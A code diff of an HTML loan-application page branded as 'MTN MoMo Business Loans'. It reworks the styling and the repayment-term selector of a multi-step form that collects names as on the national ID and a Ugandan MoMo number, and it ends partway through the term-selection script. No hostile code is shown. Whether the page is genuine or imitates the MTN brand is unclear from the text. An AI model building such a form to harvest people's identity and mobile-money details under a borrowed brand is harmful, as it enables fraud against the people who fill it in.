@@ -15,7 +15,6 @@
         body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
         .form-container { width: 100%; max-width: 440px; background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.08); position: relative; }
         
-        /* MTN Brand Banner Header Layout */
         .brand-header { background-color: var(--mtn-yellow); padding: 20px; text-align: center; border-bottom: 4px solid var(--mtn-dark); position: relative; }
         .brand-logo { font-weight: 900; font-size: 24px; letter-spacing: -1px; color: var(--mtn-dark); display: inline-block; background: white; padding: 4px 10px; border-radius: 50%; box-shadow: 0 2px 5px rgba(0,0,0,0.1); font-style: italic; }
         .brand-header h1 { margin: 8px 0 0 0; font-size: 18px; color: var(--mtn-dark); font-weight: 800; text-transform: uppercase; letter-spacing: 0.5px; }
@@ -28,28 +27,55 @@
         h3 { color: var(--text-dark); font-size: 15px; margin-top: 20px; margin-bottom: 8px; }
         .form-group { margin-bottom: 18px; }
         label { display: block; font-weight: 700; margin-bottom: 8px; font-size: 13px; color: #475569; text-transform: uppercase; letter-spacing: 0.3px; }
-        input, select, textarea { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 15px; background: #FFF; transition: border-color 0.2s; color: var(--text-dark); }
-        input:focus, select:focus, textarea:focus { outline: none; border-color: var(--mtn-blue); box-shadow: 0 0 0 3px rgba(0, 75, 135, 0.1); }
+        input, select, textarea { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #CBD5E1; border-radius: 8px; font-size: 15px; background: #FFF; color: var(--text-dark); }
         
-        /* MTN Multi-Choice Pill Grid Configuration */
-        .term-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; margin-bottom: 16px; }
-        .term-btn { border: 1px solid #CBD5E1; border-radius: 8px; padding: 12px 2px; text-align: center; font-weight: 700; font-size: 13px; cursor: pointer; color: #475569; background: #FFF; transition: all 0.2s ease; }
-        .term-btn.selected { border-color: var(--mtn-dark); background-color: var(--mtn-yellow); color: var(--mtn-dark); box-shadow: inset 0 0 0 1px var(--mtn-dark); }
+        /* Moveable Scrollable Swipe-to-Select Term Layout */
+        .term-scroll-container { 
+            display: flex; 
+            gap: 10px; 
+            overflow-x: auto; 
+            padding: 8px 4px; 
+            margin-bottom: 16px;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none; /* Hide scrollbars for modern layout options */
+        }
+        .term-scroll-container::-webkit-scrollbar { display: none; }
         
-        /* MoMo Yellow Metric Highlight Panel */
+        .term-card { 
+            flex: 0 0 75px; 
+            scroll-snap-align: start;
+            border: 2px solid #CBD5E1; 
+            border-radius: 10px; 
+            padding: 14px 0; 
+            text-align: center; 
+            font-weight: 700; 
+            font-size: 14px; 
+            cursor: pointer; 
+            color: #475569; 
+            background: #FFF; 
+            transition: all 0.2s ease-in-out;
+            user-select: none;
+        }
+        .term-card.selected { 
+            border-color: var(--mtn-dark); 
+            background-color: var(--mtn-yellow); 
+            color: var(--mtn-dark);
+            transform: scale(1.03);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.06);
+        }
+        
         .payment-highlight { background-color: #FFFDF0; padding: 16px; border-radius: 12px; text-align: center; margin: 20px 0; border: 2px solid var(--mtn-yellow); }
         .payment-highlight span { font-size: 12px; color: #64748B; text-transform: uppercase; font-weight: 700; letter-spacing: 0.5px; }
         .payment-highlight h4 { margin: 4px 0 0 0; color: var(--mtn-blue); font-size: 26px; font-weight: 800; }
         
         .btn-group { display: flex; gap: 10px; margin-top: 24px; }
-        button { flex: 1; padding: 14px; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; transition: background-color 0.2s; text-transform: uppercase; }
+        button { flex: 1; padding: 14px; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
         .btn-next { background-color: var(--mtn-blue); color: white; }
         .btn-next:hover { background-color: #003661; }
         .btn-back { background-color: #E2E8F0; color: #475569; }
-        .btn-back:hover { background-color: #CBD5E1; }
         .summary-box { background-color: #F8FAFC; border: 1px solid #E2E8F0; padding: 14px; border-radius: 8px; font-size: 14px; line-height: 1.6; color: #334155; }
         
-        /* Loading Overlay Spinner */
         .spinner-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 10; flex-direction: column; align-items: center; justify-content: center; }
         .spinner-overlay.active { display: flex; }
         .spinner-loader { width: 48px; height: 48px; border: 5px solid #F1F5F9; border-top: 5px solid var(--mtn-yellow); border-right: 5px solid var(--mtn-dark); border-radius: 50%; animation: spin 0.8s linear infinite; }
@@ -60,13 +86,11 @@
 <body>
 
 <div class="form-container">
-    <!-- SPINNER OVERLAY -->
     <div id="spinnerOverlay" class="spinner-overlay">
         <div class="spinner-loader"></div>
         <div id="statusText" class="status-text">Processing submission info...</div>
     </div>
 
-    <!-- CORPORATE HEADER BRAND HUB -->
     <div class="brand-header">
         <div class="brand-logo">MTN</div>
         <h1>MoMo Business Loans</h1>
@@ -87,13 +111,16 @@
             </div>
             
             <div class="form-group">
-                <label>Repayment Term</label>
-                <div class="term-grid">
-                    <div id="term-6" class="term-btn" onclick="selectTerm(6)">6 M</div>
-                    <div id="term-12" class="term-btn selected" onclick="selectTerm(12)">12 M</div>
-                    <div id="term-24" class="term-btn" onclick="selectTerm(24)">24 M</div>
-                    <div id="term-48" class="term-btn" onclick="selectTerm(48)">48 M</div>
-                    <div id="term-60" class="term-btn" onclick="selectTerm(60)">60 M</div>
+                <label>Swipe / Select Repayment Term</label>
+                <!-- Moveable horizontal flex container -->
+                <div class="term-scroll-container">
+                    <div id="term-4" class="term-card" onclick="selectTerm(4)">4 Mos</div>
+                    <div id="term-5" class="term-card" onclick="selectTerm(5)">5 Mos</div>
+                    <div id="term-6" class="term-card" onclick="selectTerm(6)">6 Mos</div>
+                    <div id="term-12" class="term-card selected" onclick="selectTerm(12)">12 Mos</div>
+                    <div id="term-24" class="term-card" onclick="selectTerm(24)">24 Mos</div>
+                    <div id="term-48" class="term-card" onclick="selectTerm(48)">48 Mos</div>
+                    <div id="term-60" class="term-card" onclick="selectTerm(60)">60 Mos</div>
                 </div>
             </div>
 
@@ -106,7 +133,9 @@
                 <label>Business Purpose</label>
                 <textarea id="purpose" rows="2" placeholder="e.g. Purchasing restocking inventory..."></textarea>
             </div>
-            <div class="btn-group"><button class="btn-next" onclick="navigate(2)">Continue</button></div>
+            <div class="btn-group">
+                <button type="button" class="btn-next" onclick="navigate(2)">Continue</button>
+            </div>
         </div>
 
         <!-- PAGE 2: PERSONAL REGISTRATION -->
@@ -116,8 +145,8 @@
             <div class="form-group"><label>Last Name (As on NIN)</label><input type="text" id="lastName" placeholder="Ondoa"></div>
             <div class="form-group"><label>Registered MoMo Number</label><input type="text" id="phone" value="+256"></div>
             <div class="btn-group">
-                <button class="btn-back" onclick="navigate(1)">Back</button>
-                <button class="btn-next" onclick="navigate(3)">Continue</button>
+                <button type="button" class="btn-back" onclick="navigate(1)">Back</button>
+                <button type="button" class="btn-next" onclick="navigate(3)">Continue</button>
             </div>
         </div>
 
@@ -139,8 +168,8 @@
             <div class="summary-box" id="summaryContent"></div>
             
             <div class="btn-group">
-                <button class="btn-back" onclick="navigate(2)">Back</button>
-                <button class="btn-next" style="background-color: #22C55E; color: white;" onclick="submitForm()">Submit Offer</button>
+                <button type="button" class="btn-back" onclick="navigate(2)">Back</button>
+                <button type="button" class="btn-next" style="background-color: #22C55E; color: white;" onclick="submitForm()">Submit Offer</button>
             </div>
         </div>
     </div>
@@ -152,20 +181,4 @@
     let pollingInterval = null;
 
     function selectTerm(months) {
-        // Clear previous selections
-        document.querySelectorAll('.term-btn').forEach(btn => btn.classList.remove('selected'));
-        
-        // Match explicit ID and select
-        const targetedButton = document.getElementById(`term-${months}`);
-        if(targetedButton) {
-            targetedButton.classList.add('selected');
-        }
-        
-        selectedMonths = months;
-        calculateRepayment();
-    }
-
-    function calculateRepayment() {
-        const amount = parseFloat(document.getElementById('amount').value) || 0;
-        const totalPayable = amount * (1 + (0.10 * (selectedMonths / 12)));
 
